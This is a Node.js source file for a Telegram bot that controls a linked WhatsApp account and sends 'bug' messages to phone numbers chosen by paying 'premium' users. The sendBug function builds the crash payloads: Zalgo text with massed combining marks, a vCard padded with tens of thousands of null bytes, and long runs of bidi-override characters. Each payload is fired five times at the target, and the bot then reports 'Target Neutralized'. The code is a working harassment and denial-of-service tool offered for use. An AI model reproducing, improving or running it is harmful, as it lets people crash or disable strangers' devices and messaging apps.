const { Telegraf } = require("telegraf");
const fs = require('fs');
const {
    makeWASocket,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    Browsers
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN, OWNER_ID } = require("./config");

// --- 1. INITIALIZATION ---
const bot = new Telegraf(BOT_TOKEN);
const USERS_PREMIUM_FILE = 'usersPremium.json';
let cay = null;
let isWhatsAppConnected = false;

// Ensure Premium File exists
if (!fs.existsSync(USERS_PREMIUM_FILE)) {
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify({}));
}
let usersPremium = JSON.parse(fs.readFileSync(USERS_PREMIUM_FILE, 'utf8'));

// --- 2. UTILS & HELPERS ---
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const getGreeting = () => {
    const hours = new Date().getHours();
    if (hours < 12) return "夜明け 🌆";
    if (hours < 18) return "午後 🌇";
    return "夜 🌌";
};

const isPremium = (userId) => {
    const id = userId.toString();
    if (id === OWNER_ID.toString()) return true;
    return usersPremium[id] && usersPremium[id].premiumUntil > Date.now();
};

const saveData = () => {
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium, null, 2));
};

// --- 3. WHATSAPP CONNECTION (Baileys) ---
const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    cay = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: Browsers.macOS("Safari"),
    });

    cay.ev.on('creds.update', saveCreds);

    cay.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.green('WhatsApp Connected!'));
        }
        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            isWhatsAppConnected = false;
            if (shouldReconnect) startSesi();
        }
    });
};

startSesi();

// --- 4. BUG PAYLOADS ---
const QBug = {
    key: { remoteJid: "p", fromMe: false, participant: "0@s.whatsapp.net" },
    message: { conversation: "X-TECH SYSTEM OVERLOAD" }
};

const sendBug = async (target, type) => {
    if (!cay || !isWhatsAppConnected) return;
    const zalgo = "X-TECH".split('').map(c => c + '\u0345'.repeat(500)).join('');
    const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:X-TECH\nORG:CRASH;${"\u0000".repeat(30000)}\nEND:VCARD`;
    
    switch(type) {
        case 'beta':
            await cay.sendMessage(target, { text: zalgo }, { quoted: QBug });
            break;
        case 'andro':
            await cay.sendMessage(target, { contacts: { displayName: 'Crash', contacts: [{ vcard }] } }, { quoted: QBug });
            break;
        case 'ui':
            await cay.sendMessage(target, { text: ("\u202E\u202D\u0000").repeat(20000) }, { quoted: QBug });
            break;
    }
};

// --- 5. TELEGRAM COMMANDS ---

// Pairing Command
bot.command('pair', async (ctx) => {
    const num = ctx.message.text.split(' ')[1]?.replace(/[^0-9]/g, '');
    if (!num) return ctx.reply("Usage: /pair 263xxxxxx");
    
    try {
        const code = await cay.requestPairingCode(num);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        ctx.reply(`🔑 *Pairing Code:* \`${formattedCode}\``, { parse_mode: 'Markdown' });
    } catch (e) {
        ctx.reply("❌ Error requesting code. Try again.");
    }
});

// Menu Commands
bot.command(['start', 'help'], (ctx) => {
    const msg = `👋 Hello, I am the *X-TECH Bot*\n\n「 𝐒 𝐔 𝐁 𝐌 𝐄 𝐍 𝐔 」\n▢ /menu - Bug Menu\n▢ /ownermenu - Admin\n▢ /status - Bot Status`;
    ctx.replyWithPhoto("https://files.catbox.moe/mzr41r.jpg", { caption: msg, parse_mode: 'Markdown' });
});

bot.command('menu', (ctx) => {
    const msg = `👋 Selamat ${getGreeting()}!\n\nᝄ ⌜ 𝘽 𝙐 𝙂 𝙈 𝙀 𝙉 𝙐 ⌟\n䒘 /xcbeta [num]\n䒘 /xiosinvis [num]\n䒘 /xcandro [num]\n䒘 /xciospay [num]\n䒘 /xcsystemui [num]`;
    ctx.replyWithPhoto("https://files.catbox.moe/mzr41r.jpg", { caption: msg });
});

// Bug Execution Handler
const executeBug = async (ctx, type) => {
    if (!isPremium(ctx.from.id)) return ctx.reply("❌ Premium Only!");
    if (!isWhatsAppConnected) return ctx.reply("❌ WhatsApp Not Linked!");
    
    const targetNum = ctx.message.text.split(' ')[1];
    if (!targetNum) return ctx.reply("Usage: /command 263xxxx");
    
    const target = targetNum.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    ctx.reply(`🚀 *Sending Bug to ${targetNum}...*`, { parse_mode: 'Markdown' });

    for (let i = 0; i < 5; i++) {
        await sendBug(target, type);
        await sleep(1500);
    }
    ctx.reply("✅ Target Neutralized.");
};

bot.command('xcbeta', ctx => executeBug(ctx, 'beta'));
bot.command('xcandro', ctx => executeBug(ctx, 'andro'));
bot.command('xcsystemui', ctx => executeBug(ctx, 'ui'));

// Admin Commands
bot.command('addprem', (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return;
    const args = ctx.message.text.split(' ');
    const target = args[1];
    const days = parseInt(args[2]) || 30;
    
    usersPremium[target] = { premiumUntil: Date.now() + (days * 24 * 60 * 60 * 1000) };
    saveData();
    ctx.reply(`✅ User ${target} added for ${days} days.`);
});

bot.command('status', ctx => {
    ctx.reply(isWhatsAppConnected ? "✅ WhatsApp: Connected" : "❌ WhatsApp: Disconnected");
});

bot.launch();
console.log(chalk.blue("X-TECH Hybrid Bot is Live"));

// Cleanup expired premium
setInterval(() => {
    const now = Date.now();
    let changed = false;
    for (const id in usersPremium) {
        if (usersPremium[id].premiumUntil < now) {
            delete usersPremium[id];
            changed = true;
        }
    }
    if (changed) saveData();
}, 3600000);
